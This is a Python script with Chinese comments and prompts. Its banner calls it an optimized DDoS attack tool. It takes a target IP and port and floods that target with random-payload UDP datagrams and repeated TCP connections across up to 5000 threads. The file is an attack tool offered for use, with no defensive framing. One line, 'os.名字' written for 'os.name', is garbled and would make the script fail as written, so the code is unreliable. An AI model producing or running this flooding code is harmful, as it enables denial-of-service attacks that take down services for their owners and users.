# -*- coding: utf-8 -*-

import sys
import os
import time
import socket
import random
import threading
import concurrent.futures
from typing import List
import ipaddress
import array

# 优化：使用更高效的随机数据生成
def generate_payload(size: int = None) -> bytes:
    if size is None:
        size = random.randint(1024, 65500)
    return array.array('B', [random.randint(0, 255) for _ in range(size)]).tobytes()

# 优化：预生成payload池
def create_payload_pool(count: int = 10) -> List[bytes]:
    return [generate_payload() for _ in range(count)]

# 优化：改进的socket池创建
def create_socket_pool(pool_size: int = 10) -> List[socket.socket]:
    sockets = []
    for _ in range(pool_size):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 65507)  # 最大UDP缓冲区
        sockets.append(sock)
    return sockets

# 优化：改进的TCP SYN洪水
def tcp_syn_flood(target_ip: str, target_port: int, payload_pool: List[bytes]):
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)  # 设置超时以提高效率
            s.connect((target_ip, target_port))
            s.send(random.choice(payload_pool))
            s.close()
        except:
            pass

# 优化：改进的UDP洪水
def udp_flood(sock: socket.socket, target_ip: str, target_port: int, payload_pool: List[bytes]):
    while True:
        try:
            sock.sendto(random.choice(payload_pool), (target_ip, target_port))
        except:
            continue

def validate_input(ip: str, port: int, threads: int) -> bool:
    try:
        ipaddress.ip_address(ip)
        if not (0 <= port <= 65535):
            print("端口必须在 0-65535 之间")
            return False
        if not (1 <= threads <= 5000):
            print("线程数必须在 1-5000 之间")
            return False
        return True
    except ValueError:
        print("无效的 IP 地址")
        return False

def main():
    os.system('cls' if os.名字 == 'nt' else 'clear')
    print("增强版 DDos 攻击工具 (优化版)")
    print("-" * 50)
    
    target_ip = input("输入目标 IP: ")
    target_port = int(input("输入目标端口: "))
    thread_count = int(input("输入线程数量 (建议 100-1000): "))
    attack_mode = input("选择攻击模式 (1: UDP, 2: TCP, 3: 混合): ")
    
    if not validate_input(target_ip, target_port, thread_count):
        return

    print("\n初始化攻击...")
    # 预生成payload池以提高性能
    payload_pool = create_payload_pool(20)
    
    print(f"目标 IP: {target_ip}")
    print(f"目标端口: {target_port}")
    print(f"线程数量: {thread_count}")
    
    # 优化：使用更大的线程池
    with concurrent.futures.ThreadPoolExecutor(max_workers=thread_count) as executor:
        if attack_mode in ['1', '3']:
            # UDP攻击优化
            socket_pool = create_socket_pool(min(thread_count // 2, 100))
            for sock in socket_pool:
                for _ in range(max(1, thread_count // len(socket_pool))):
                    executor.submit(udp_flood, sock, target_ip, target_port, payload_pool)
        
        if attack_mode in ['2', '3']:
            # TCP攻击优化
            for _ in range(thread_count):
                executor.submit(tcp_syn_flood, target_ip, target_port, payload_pool)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\n攻击已停止")
        sys.exit(0)
